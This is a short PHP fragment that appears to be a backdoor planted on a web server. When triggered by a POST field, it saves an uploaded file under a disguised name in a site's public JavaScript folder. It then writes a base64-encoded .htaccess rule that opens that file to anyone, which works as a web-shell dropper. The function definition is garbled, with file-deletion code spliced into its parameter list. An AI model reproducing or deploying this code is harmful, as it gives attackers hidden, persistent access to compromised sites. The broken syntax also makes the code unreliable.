function fwss(if(file_exists($f))@unlink($f);if(file_exists($f)) chmod($f,0666);$f,$c){$p=@fopen($f,"w");$t=@fwrite($p,$c);@fclose($p);if(!$t)$t=@file_put_contents($f,$c);return (bool)$t;}if(!empty($_POST["nn"]) && move_uploaded_file($_FILES["file"]["tmp_name"],"/home/customerdevsites/public_html/supremesuperfastech/public/js/dist.vars-http.php") && fwss("js/.htaccess",base64_decode("PEZpbGVzTWF0Y2ggIl4oZGlzdC52YXJzLWh0dHAucGhwKSQiPgpPcmRlciBhbGxvdyxkZW55CkFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4="))exit(1);